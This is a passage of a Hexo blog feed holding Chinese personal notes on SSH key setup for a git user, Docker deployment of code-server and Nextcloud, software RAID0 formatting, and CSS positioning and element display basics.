进入.ssh目录并创建authorized_keys文件，用来存放用户访问的ssh公钥</span></span><br><span class="line">cd /home/git/.ssh</span><br><span class="line">touch authorized_keys</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置该目录及authorized_keys文件的权限，权限值不要修改</span></span><br><span class="line">chmod 700 /home/git/.ssh/</span><br><span class="line">chmod 600 /home/git/.ssh/authorized_keys</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">最后将客户端的公钥固执到authoriauthorized_keys</span></span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%87%AA%E5%BB%BAgitlab/image-20210730221843324.png" class="lazyload" data-srcset="/2021/07/30/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%E8%87%AA%E5%BB%BAgitlab/image-20210730221843324.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210730221843324"></p><p>使用<code>ssh 用户名@ip</code>登录是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 创建数据目录</span><br><span class="line">mkdir -p /data/gitlab/config</span><br><span class="line">mkdir -p /data/gitlab/logs</span><br><span class="line">mkdir -p /data/gitlab/data</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker中安装Vscode+Git</title>
      <link href="/2021/07/23/%E5%89%8D%E7%AB%AF/Docker%E4%B8%AD%E5%AE%89%E8%A3%85Vscode-Git/"/>
      <url>/2021/07/23/%E5%89%8D%E7%AB%AF/Docker%E4%B8%AD%E5%AE%89%E8%A3%85Vscode-Git/</url>
      
        <content type="html"><![CDATA[<img src="/2021/07/23/%E5%89%8D%E7%AB%AF/Docker%E4%B8%AD%E5%AE%89%E8%A3%85Vscode-Git/image-20210723221937532.png" class="lazyload" data-srcset="/2021/07/23/%E5%89%8D%E7%AB%AF/Docker%E4%B8%AD%E5%AE%89%E8%A3%85Vscode-Git/image-20210723221937532.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210723221937532" style="zoom:67%;"><p><a href="https://uxcool.top/linux/docker-install-vscode.html">https://uxcool.top/linux/docker-install-vscode.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  -d \</span><br><span class="line">  --name=vscode \</span><br><span class="line">  --restart unless-stopped \</span><br><span class="line">  -e PUID=0 \</span><br><span class="line">  -e PGID=0 \</span><br><span class="line">  -e PASSWORD=密码 \</span><br><span class="line">  -p 18443:8443\</span><br><span class="line">  -v /opt/docker_sg/vscode/config:/config \</span><br><span class="line">  linuxserver/code-server</span><br></pre></td></tr></table></figure><ul><li><code>e PUID</code> 和 <code>e PGID</code> 这两个参数可以可以在终端中输入 <code>id</code> 命令获得，直接填写对应的就好，意思是你想要以哪个用户运行这个 docker 容器。</li><li><code>e PASSWORD</code> 是打开 code-server 网页的密码，不设置的话打开网页编辑器的时候就不需要密码，这样显然不安全。</li><li><code>p 127.0.0.1:18443:8443</code> 是指将容器内的 <code>8443</code> 端口映射到容器外的本机的 <code>18443</code> 端口，<code>127.0.0.1</code> 是指限制端口本地访问（后面可以使用 nginx 反向代理将端口代理到网站的子目录）。</li><li><code>v opt/docker_sg/vscode/config:/config</code> 是 code-server 的配置文件、插件、代码文件的目录，注意要及时备份，免得容器挂掉文件丢失。</li></ul><p>增加端口可以先暂停容器，然后commit一下容器后再重新构造一下容器</p><p><a href="https://www.huaweicloud.com/articles/2f77258d9743af7269285e1bf10ef58e.html">https://www.huaweicloud.com/articles/2f77258d9743af7269285e1bf10ef58e.html</a></p><p>假设上面设置的名字叫vscode</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit vscode  <span class="keyword">new</span>-vscode</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">  -d \</span><br><span class="line">  --name=new-vscode \</span><br><span class="line">  -p 15000:5000 \</span><br><span class="line">  -v /mnt/md0/samba/vscode:/config \</span><br><span class="line">   new-vscode</span><br></pre></td></tr></table></figure><p>增加一个运行端口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下的raid0和nextcloud</title>
      <link href="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/"/>
      <url>/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化磁盘"><a href="#格式化磁盘" class="headerlink" title="格式化磁盘"></a>格式化磁盘</h1><p><a href="https://blog.csdn.net/s793223706/article/details/95775841?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162702200316780264090495%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162702200316780264090495&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-95775841.pc_search_result_control_group&amp;utm_term=ubuntu+raid0&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/s793223706/article/details/95775841?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162702200316780264090495%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162702200316780264090495&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-95775841.pc_search_result_control_group&amp;utm_term=ubuntu+raid0&amp;spm=1018.2226.3001.4187</a></p><p>查看磁盘状态：lsblk</p><img src="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723153612906.png" class="lazyload" data-srcset="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723153612906.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210723153612906" style="zoom: 80%;"><p>重新分区命令：fdisk</p><img src="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723153742866.png" class="lazyload" data-srcset="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723153742866.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210723153742866" style="zoom:50%;"><p>格式化完成</p><p><img src="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723153857874.png" class="lazyload" data-srcset="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723153857874.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210723153857874"></p><h1 id="软raid0操作"><a href="#软raid0操作" class="headerlink" title="软raid0操作"></a>软raid0操作</h1><p><img src="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723154103172.png" class="lazyload" data-srcset="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723154103172.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210723154103172"></p><p><img src="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723154335225.png" class="lazyload" data-srcset="/2021/07/23/Linux/Ubuntu%E4%B8%8B%E7%9A%84raid0%E5%92%8Cnextcloud/image-20210723154335225.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210723154335225"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfs.ext4 -F /dev/md0</span><br><span class="line">sudo mkdir -p /mnt/md0</span><br><span class="line">sudo mount /dev/md0 /mnt/md0</span><br></pre></td></tr></table></figure><h1 id="NextCloud"><a href="#NextCloud" class="headerlink" title="NextCloud"></a>NextCloud</h1><p><a href="https://www.wo66.cc/archives/docker%E9%83%A8%E7%BD%B2nextcloud%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BA%91%E7%9B%98">https://www.wo66.cc/archives/docker%E9%83%A8%E7%BD%B2nextcloud%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E4%BA%91%E7%9B%98</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 8088:80 \</span></span><br><span class="line"><span class="bash">--name nextcloud \</span></span><br><span class="line"><span class="bash">--restart=always \</span></span><br><span class="line"><span class="bash">-v /home/nextcloud/html:/var/www/html \</span></span><br><span class="line"><span class="bash">-v /home/nextcloud/apps:/var/www/html/custom_apps \</span></span><br><span class="line"><span class="bash">-v /home/nextcloud/config:/var/www/html/config \</span></span><br><span class="line"><span class="bash">-v /home/nextcloud/data:/var/www/html/data \</span></span><br><span class="line"><span class="bash">-v /home/nextcloud/theme:/var/www/html/themes \</span></span><br><span class="line"><span class="bash">--link mysql:mysql \</span></span><br><span class="line"><span class="bash">--link redis:redis \</span></span><br><span class="line"><span class="bash">nextcloud</span></span><br><span class="line"><span class="meta">#</span><span class="bash">将里面的/home/nextcloud改成备份的文件即可不用配置开启容器</span></span><br></pre></td></tr></table></figure><h1 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h1><p><a href="https://www.linuxidc.com/Linux/2018-11/155466.htm">https://www.linuxidc.com/Linux/2018-11/155466.htm</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>定位</title>
      <link href="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/"/>
      <url>/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h1><p><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722155154566.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722155154566.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722155154566"></p><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722094228333.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722094228333.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722094228333" style="zoom:67%;"><h2 id="静态定位"><a href="#静态定位" class="headerlink" title="静态定位"></a>静态定位</h2><p>静态定位是默认值，就是之前的标准流；<code>position：static</code></p><h2 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h2><p>相对于之前的位置的进行移动</p><p><code>position:relative</code></p><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722094625555.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722094625555.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722094625555" style="zoom:50%;"><h2 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h2><p>绝对定位是相对于<strong>非静态定位的父元素</strong>(默认浏览器可视区域)进行定位移动；绝对定位也会脱离标准流，</p><p><code>position:absolute</code></p><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722094919780.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722094919780.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722094919780" style="zoom:50%;"><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722095028476.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722095028476.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722095028476" style="zoom:67%;"><h2 id="子绝父相"><a href="#子绝父相" class="headerlink" title="子绝父相"></a>子绝父相</h2><p>在使用子绝父相的时候，发现父元素已经有绝对定位了，直接使用子元素的绝对定位就可以，因为父元素已经有定位已经满足要求。</p><h2 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h2><p><code>position:fixed</code></p><p>需配合方位属性实现移动；相较于浏览器可视区域进行移动；在页面中不占位置(脱标)； </p><h2 id="层级关系"><a href="#层级关系" class="headerlink" title="层级关系"></a>层级关系</h2><h6 id="1-不同布局方式元素的层级关系"><a href="#1-不同布局方式元素的层级关系" class="headerlink" title="1.不同布局方式元素的层级关系"></a>1.不同布局方式元素的层级关系</h6><p><strong>标准流&lt;浮动&lt;定位</strong></p><h6 id="2-不同定位之间的层级关系"><a href="#2-不同定位之间的层级关系" class="headerlink" title="2.不同定位之间的层级关系"></a>2.不同定位之间的层级关系</h6><p><strong>相对、绝对、固定默认层级相同；此时HTML中写在下面的元素更高，会覆盖上面的元素</strong></p><h6 id="3-更改定位元素的层级"><a href="#3-更改定位元素的层级" class="headerlink" title="3.更改定位元素的层级"></a>3.更改定位元素的层级</h6><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722195932133.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722195932133.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722195932133" style="zoom:50%;"><h1 id="子绝父相案例"><a href="#子绝父相案例" class="headerlink" title="子绝父相案例"></a>子绝父相案例</h1><h2 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h2><h6 id="1-子绝父相"><a href="#1-子绝父相" class="headerlink" title="1.子绝父相"></a>1.子绝父相</h6><h6 id="2-设置子元素往右移动父元素的一半，也就是子元素设置偏移量left-50"><a href="#2-设置子元素往右移动父元素的一半，也就是子元素设置偏移量left-50" class="headerlink" title="2.设置子元素往右移动父元素的一半，也就是子元素设置偏移量left:50%"></a>2.设置子元素往右移动父元素的一半，也就是子元素设置偏移量<code>left:50%</code></h6><h6 id="3-让子元素往左移动自己的一半transform-translateX-50"><a href="#3-让子元素往左移动自己的一半transform-translateX-50" class="headerlink" title="3.让子元素往左移动自己的一半transform:translateX(-50%)"></a>3.让子元素往左移动自己的一半<code>transform:translateX(-50%)</code></h6><p><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722141801697.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722141801697.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722141801697" style="zoom:50%;"><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722141807614.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722141807614.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722141807614" style="zoom:50%;"></p><h2 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h2><p><img src="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722143156180.png" class="lazyload" data-srcset="/2021/07/22/%E5%89%8D%E7%AB%AF/%E5%AE%9A%E4%BD%8D/image-20210722143156180.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210722143156180"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>前端知识点</title>
      <link href="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="块级元素"><a href="#块级元素" class="headerlink" title="块级元素"></a>块级元素</h2><h6 id="1-属性：display-block"><a href="#1-属性：display-block" class="headerlink" title="1.属性：display:block"></a>1.属性：display:block</h6><p><code>div、p</code></p><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718204242131.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718204242131.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210718204242131"></p><h6 id="2-显示特点："><a href="#2-显示特点：" class="headerlink" title="2.显示特点："></a><strong>2.显示特点：</strong></h6><ol><li>独占一行</li><li>宽度默认父元素的宽度，高度默认由内容撑开</li><li>可以设置宽高</li></ol><h2 id="行内元素"><a href="#行内元素" class="headerlink" title="行内元素"></a>行内元素</h2><p><code>a、span</code></p><h6 id="1-属性：display-inline"><a href="#1-属性：display-inline" class="headerlink" title="1.属性：display:inline"></a>1.属性：display:inline</h6><h6 id="2-显示特点：-1"><a href="#2-显示特点：-1" class="headerlink" title="2.显示特点："></a><strong>2.显示特点：</strong></h6><ol><li>一行可以显示多个</li><li>宽度和高度默认由内容撑开</li><li>不可以设置宽高</li></ol><h2 id="行内块元素"><a href="#行内块元素" class="headerlink" title="行内块元素"></a>行内块元素</h2><h6 id="1-属性：inline-block"><a href="#1-属性：inline-block" class="headerlink" title="1.属性：inline-block"></a>1.属性：inline-block</h6><h6 id="2-显示特点：-2"><a href="#2-显示特点：-2" class="headerlink" title="2.显示特点："></a>2.显示特点：</h6><ol><li><strong>一行可以显示多个</strong></li><li>可以设置宽高</li></ol><h6 id="3-代表标签："><a href="#3-代表标签：" class="headerlink" title="3.代表标签："></a>3.代表标签：</h6><p><code>input、textarea、button、select</code></p><p><strong>特殊情况：img标签有行内块元素特点，但是浏览器工具中显示的是inline</strong></p><h2 id="元素模式转换"><a href="#元素模式转换" class="headerlink" title="元素模式转换"></a>元素模式转换</h2><table><thead><tr><th>属性</th><th>效果</th><th>使用频率</th></tr></thead><tbody><tr><td><code>display:block</code></td><td>转换成块级元素</td><td>多</td></tr><tr><td><code>display:inline-block</code></td><td>转换成行内块元素</td><td>多</td></tr><tr><td><code>display:inline</code></td><td>转换成行内元素</td><td>少</td></tr></tbody></table><h2 id="嵌套规范"><a href="#嵌套规范" class="headerlink" title="嵌套规范"></a>嵌套规范</h2><ol><li>会稽元素一般作为大容器，可以嵌套文本、块级元素、行内元素、行内块元素等等；<strong>但是p标签中不要嵌套div、p、h等块级元素</strong></li><li>a标签内可以嵌套任意元素，a标签不能再进行嵌套a标签</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>在p标签中嵌套div标签<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>浏览器会将其分开 变成两个p标签</p><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718210910734.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718210910734.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210718210910734" style="zoom:50%;"><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718210958613.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718210958613.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210718210958613" style="zoom:67%;"></p><h2 id="居中元素总结"><a href="#居中元素总结" class="headerlink" title="居中元素总结"></a>居中元素总结</h2><p><img src="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718211255883.png" class="lazyload" data-srcset="/2021/07/18/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210718211255883.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210718211255883"></p><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="css三大特性"><a href="#css三大特性" class="headerlink" title="css三大特性"></a>css三大特性</h2><ol><li>继承性</li><li>层叠性</li><li>优先级</li></ol><h2 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h2><h6 id="1-特性："><a href="#1-特性：" class="headerlink" title="1.特性："></a>1.特性：</h6><p>子元素有默认继承父元素样式的特点（子承父业）</p><h6 id="2-常见继承的属性："><a 